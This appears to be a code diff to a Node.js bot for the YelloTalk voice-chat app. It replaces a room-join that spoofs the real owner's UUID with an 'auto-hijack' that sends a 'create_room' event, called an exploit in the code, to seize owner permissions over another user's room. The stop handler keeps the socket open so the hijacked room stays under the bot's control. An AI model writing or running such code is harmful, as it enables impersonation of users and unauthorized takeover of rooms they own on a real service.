@@ -1012,31 +1012,44 @@ app.post('/api/bot/start', async (req, res) => {
 
         console.log(`🎯 Joining room: ${room.topic}`);
 
-        // Join room - use owner's UUID if auto-hijack enabled
-        const joinUuid = botState.autoHijackRooms ? originalRoomOwner.uuid : config.user_uuid;
-        const joinName = botState.autoHijackRooms ? config.pin_name : config.pin_name;
-
-        console.log(`🔑 Join strategy: ${botState.autoHijackRooms ? 'AS OWNER (spoofing UUID)' : 'AS BOT (normal)'}`);
-        console.log(`   UUID: ${joinUuid}`);
-        console.log(`   Name: ${joinName}`);
-
+        // Join room with bot's UUID (normal join)
         yellotalkSocket.emit('join_room', {
           room: roomId,
-          uuid: joinUuid,  // Use owner's UUID if hijack enabled!
+          uuid: config.user_uuid,
           avatar_id: config.avatar_id,
           gme_id: String(room.gme_id),
           campus: room.owner.group_shortname || 'No Group',
-          pin_name: joinName
+          pin_name: config.pin_name
         }, (joinResponse) => {
           console.log('📥 Join ACK:', joinResponse);
 
-          if (joinResponse?.result === 200) {
-            if (botState.autoHijackRooms) {
-              console.log('✅ Joined AS OWNER (using owner UUID)');
-              console.log('🔓 Should have owner permissions immediately!');
-            } else {
-              console.log('✅ Joined as regular bot');
-            }
+          // 🔥 AUTOMATIC ROOM HIJACK - Claim ownership with create_room (if enabled)!
+          if (joinResponse?.result === 200 && botState.autoHijackRooms) {
+            setTimeout(() => {
+              console.log('\n🔥 AUTO-HIJACKING ROOM (create_room exploit)...');
+
+              yellotalkSocket.emit('create_room', {
+                room: roomId,
+                uuid: config.user_uuid,
+                limit_speaker: 0
+              }, (createResp) => {
+                console.log('📥 create_room Response:', createResp);
+
+                if (createResp?.result === 200) {
+                  console.log('✅✅✅ ROOM HIJACKED! Bot has OWNER permissions!');
+                  console.log('🔓 Can now lock/unlock speaker slots!');
+                  console.log('⚠️  Note: Room will close if bot disconnects');
+
+                  io.emit('room-hijacked', { success: true });
+                } else {
+                  console.log('⚠️  Hijack might have failed');
+                  io.emit('room-hijacked', { success: false });
+                }
+              });
+            }, 1000);
+          } else if (joinResponse?.result === 200 && !botState.autoHijackRooms) {
+            console.log('ℹ️  Auto-hijack DISABLED - No speaker control permissions');
+            console.log('💡 Enable auto-hijack toggle to control speaker slots');
           }
         });
 
@@ -1420,27 +1433,45 @@ app.post('/api/bot/stop', (req, res) => {
   console.log(`Socket connected: ${yellotalkSocket?.connected}`);
   console.log('='.repeat(80) + '\n');
 
-  // Leave room gracefully (no hijack to un-do!)
-  if (yellotalkSocket && yellotalkSocket.connected && botState.currentRoom) {
-    const roomId = botState.currentRoom.id;
-    console.log('🚪 Leaving room as participant...');
+  // Handle leaving based on whether we hijacked or not
+  if (yellotalkSocket && yellotalkSocket.connected) {
+    if (botState.autoHijackRooms && botState.currentRoom) {
+      // HIJACKED: Keep socket alive to prevent room closure
+      console.log('⚠️  HIJACKED MODE: Keeping socket alive to prevent room closure');
+      console.log('📋 Removing event listeners but maintaining connection...');
 
-    yellotalkSocket.emit('leave_room', {
-      room: roomId,
-      uuid: config.user_uuid
-    }, (leaveResp) => {
-      console.log('📥 leave_room response:', leaveResp);
+      yellotalkSocket.off('new_message');
+      yellotalkSocket.off('participant_changed');
+      yellotalkSocket.off('speaker_changed');
+      yellotalkSocket.off('load_message');
+      yellotalkSocket.off('live_end');
+      yellotalkSocket.off('owner_changed');
+
+      console.log('✅ Bot stopped - Socket alive in background');
+      console.log('💡 Room will NOT close. Restart bot-server to fully disconnect.');
+    } else {
+      // NOT HIJACKED: Can leave normally
+      console.log('🚪 NOT HIJACKED: Leaving room normally...');
+
+      if (botState.currentRoom) {
+        yellotalkSocket.emit('leave_room', {
+          room: botState.currentRoom.id,
+          uuid: config.user_uuid
+        }, (leaveResp) => {
+          console.log('📥 leave_room response:', leaveResp);
+        });
+      }
 
       setTimeout(() => {
         console.log('🔌 Disconnecting...');
         yellotalkSocket.removeAllListeners();
         yellotalkSocket.disconnect();
         yellotalkSocket = null;
-        console.log('✅ Left room cleanly - room should stay open!');
-      }, 300);
-    });
+        console.log('✅ Left room cleanly');
+      }, 500);
+    }
   } else {
-    console.log('ℹ️  No active connection to leave');
+    console.log('ℹ️  No active connection');
   }
 
   // Clear follow interval
